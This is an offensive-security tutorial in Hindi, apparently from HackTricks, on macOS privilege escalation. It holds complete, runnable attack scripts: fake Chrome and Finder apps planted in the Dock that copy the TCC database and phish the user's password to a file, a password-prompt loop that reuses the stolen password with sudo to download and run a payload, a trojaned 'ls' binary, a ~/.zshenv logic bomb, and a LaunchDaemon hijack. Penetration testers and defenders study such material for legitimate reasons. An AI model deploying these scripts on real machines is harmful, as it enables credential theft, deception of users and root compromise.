# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

यदि आप TCC privilege escalation की तलाश में यहां आए हैं, तो यहां जाएं:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

ध्यान दें कि **Linux/Unix को प्रभावित करने वाली अधिकांश privilege escalation tricks MacOS** machines को भी प्रभावित करेंगी। इसलिए यहां देखें:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

आप मूल [Sudo Hijacking technique को Linux Privilege Escalation post](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) में पा सकते हैं।

हालांकि, macOS, user द्वारा **`sudo`** execute करने पर user का **`PATH`** **maintain करता है**। इसका अर्थ है कि इस attack को अंजाम देने का एक अन्य तरीका उन **अन्य binaries को hijack करना** होगा जिन्हें victim **sudo run करते समय** execute करेगा:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ध्यान दें कि जो user terminal का उपयोग करता है, उसके पास **Homebrew installed** होने की बहुत अधिक संभावना है। इसलिए **`/opt/homebrew/bin`** में binaries को hijack करना संभव है।

### Dock Impersonation

कुछ **social engineering** का उपयोग करके आप **उदाहरण के लिए Google Chrome** का dock के अंदर **impersonate** कर सकते हैं और वास्तव में अपनी script execute कर सकते हैं:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
कुछ सुझाव:

- Dock में जाँचें कि Chrome मौजूद है या नहीं, और यदि मौजूद हो तो उस entry को **remove** करें तथा **fake** **Chrome entry को Dock array में उसी position पर add** करें।

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
कुछ सुझाव:

- आप **Finder को Dock से हटा नहीं सकते**, इसलिए यदि आप इसे Dock में जोड़ने वाले हैं, तो आप fake Finder को real Finder के ठीक बगल में रख सकते हैं। इसके लिए आपको **Dock array की शुरुआत में fake Finder entry जोड़नी होगी**।
- दूसरा विकल्प यह है कि इसे Dock में न रखें और केवल इसे open करें; "Finder asking to control Finder" इतना अजीब नहीं है।
- बिना किसी भयानक box के password पूछे **root तक escalate** करने का एक और विकल्प यह है कि Finder से privileged action करने के लिए वास्तव में password पूछवाया जाए:
- Finder से **`/etc/pam.d`** में एक नई **`sudo`** file copy करने को कहें। (Password पूछने वाला prompt बताएगा कि "Finder wants to copy sudo")
- Finder से एक नया **Authorization Plugin** copy करने को कहें। (आप file name को नियंत्रित कर सकते हैं, इसलिए password पूछने वाला prompt बताएगा कि "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware अक्सर user interaction का दुरुपयोग करके **sudo-capable password capture** करता है और उसे programmatically reuse करता है। एक सामान्य flow:

1. `whoami` से logged in user की पहचान करें।
2. **Password prompts को loop करें** जब तक `dscl . -authonly "$user" "$pw"` success return न करे।
3. Credential को cache करें (जैसे, `/tmp/.pass`) और `sudo -S` (password over stdin) से privileged actions चलाएँ।

न्यूनतम chain का उदाहरण:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
चुराए गए password का फिर से उपयोग **`xattr -c` के साथ Gatekeeper quarantine को clear करने**, LaunchDaemons या अन्य privileged files को कॉपी करने और अतिरिक्त stages को non-interactively चलाने के लिए किया जा सकता है।

## नए macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` अभी भी usable है

`AuthorizationExecuteWithPrivileges` को 10.7 में deprecated कर दिया गया था, लेकिन यह **Sonoma/Sequoia पर अभी भी काम करता है**। कई commercial updaters किसी untrusted path के साथ `/usr/libexec/security_authtrampoline` को invoke करते हैं। यदि target binary user-writable है, तो आप एक trojan plant करके legitimate prompt का लाभ उठा सकते हैं:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
ऊपर दिए गए **masquerading tricks** के साथ मिलाकर एक विश्वसनीय password dialog प्रस्तुत करें।


### Privileged helper / XPC triage

कई आधुनिक third-party macOS privescs एक ही pattern का पालन करते हैं: एक **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** से एक **Mach/XPC service** expose करता है, फिर helper या तो **client को validate नहीं करता**, उसे **बहुत देर से validate करता है** (PID race), या ऐसा **root method** expose करता है जो **user-controlled path/script** को consume करता है। VPN clients, game launchers और updaters में हाल के कई helper bugs के पीछे यही bug class है।<sup>[[4]](#references)</sup>

त्वरित triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
विशेष रूप से उन helpers पर ध्यान दें जो:

- **uninstall के बाद भी** requests स्वीकार करते रहते हैं, क्योंकि job `launchd` में loaded रह गया
- **`/Applications/...`** या non-root users द्वारा writable अन्य paths से scripts execute करते हैं या configuration पढ़ते हैं
- **PID-based** या **bundle-id-only** peer validation पर निर्भर होते हैं, जिसे race किया जा सकता है

Helper authorization bugs के अधिक विवरण के लिए [इस page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) को देखें।

### PackageKit script environment inheritance (CVE-2024-27822)

Apple द्वारा इसे **Sonoma 14.5**, **Ventura 13.6.7** और **Monterey 12.7.5** में ठीक किए जाने तक, **`Installer.app`** / **`PackageKit.framework`** के माध्यम से user-initiated installs, **PKG scripts को current user's environment के अंदर root के रूप में execute** कर सकते थे। इसका मतलब है कि **`#!/bin/zsh`** का उपयोग करने वाला package attacker की **`~/.zshenv`** को load करके उसे **root** के रूप में run कर सकता था, जब victim ने package install किया।<sup>[[3]](#references)</sup>

यह **logic bomb** के रूप में विशेष रूप से interesting है: आपको केवल user's account में foothold और एक writable shell startup file चाहिए, फिर आप किसी vulnerable **zsh-based** installer के user द्वारा execute किए जाने की प्रतीक्षा करते हैं। यह सामान्यतः **MDM/Munki** deployments पर लागू नहीं होता, क्योंकि वे root user के environment के अंदर run होते हैं।<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
यदि आप installer-specific abuse में और गहराई से जाना चाहते हैं, तो [इस पेज](macos-files-folders-and-binaries/macos-installers-abuse.md) को भी देखें।

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

यदि कोई LaunchDaemon plist या उसका `ProgramArguments` target **user-writable** है, तो उसे बदलकर और फिर launchd को reload करने के लिए force करके आप privilege escalate कर सकते हैं:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
यह **CVE-2025-24085** के लिए प्रकाशित exploit pattern को दर्शाता है, जिसमें attacker code को root के रूप में execute करने के लिए writable plist का दुरुपयोग किया गया था।

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` में मौजूद एक **race** local attacker को threads के बीच `setgid()`/`getgid()` loops चलाकर read-only credential pointer (`proc_ro.p_ucred`) को corrupt करने देती है, जब तक कि torn `memcpy` न हो जाए। सफल corruption से **uid 0** और kernel memory access प्राप्त होता है। Minimal PoC structure:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming के साथ उपयोग करके controlled data को उस स्थान पर रखें जहाँ pointer दोबारा पढ़ा जाता है। vulnerable builds पर यह SIP bypass requirements के बिना एक reliable **local kernel privesc** है।<sup>[[2]](#references)</sup>

### Migration assistant के माध्यम से SIP bypass ("Migraine", CVE-2023-32369)

यदि आपके पास पहले से root है, तो SIP अभी भी system locations में writes को block करता है। **Migraine** bug, Migration Assistant entitlement `com.apple.rootless.install.heritable` का दुरुपयोग करके एक child process spawn करता है, जो SIP bypass inherit करता है और protected paths (जैसे, `/System/Library/LaunchDaemons`) को overwrite करता है।<sup>[[1]](#references)</sup> Chain:

1. live system पर root प्राप्त करें।
2. attacker-controlled binary चलाने के लिए crafted state के साथ `systemmigrationd` को trigger करें।
3. SIP-protected files को patch करने के लिए inherited entitlement का उपयोग करें, जिससे reboot के बाद भी persistence बनी रहती है।

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

कई Apple daemons XPC के माध्यम से **NSPredicate** objects स्वीकार करते हैं और केवल `expressionType` field को validate करते हैं, जिसे attacker नियंत्रित कर सकता है। ऐसे predicate को craft करके, जो arbitrary selectors evaluate करता है, आप **root/system XPC services** (जैसे, `coreduetd`, `contextstored`) में **code execution** प्राप्त कर सकते हैं। जब इसे initial app sandbox escape के साथ combine किया जाता है, तो यह **user prompts के बिना privilege escalation** प्रदान करता है। ऐसे XPC endpoints खोजें जो predicates को deserialize करते हैं और जिनमें robust visitor नहीं है।

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass और privilege escalation

**Any user** (यहाँ तक कि unprivileged users भी) `-o noowners` के साथ Time Machine snapshot create और mount कर सकता है और उस snapshot की **ALL files** को **access** कर सकता है, जिससे live volume पर ownership checks bypass हो जाते हैं। आवश्यक एकमात्र privilege यह है कि उपयोग किए गए application (जैसे `Terminal`) के पास **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) हो।

Commands और पूरी explanation TCC bypasses page में हैं:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

यह privileges escalate करने में उपयोगी हो सकता है:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
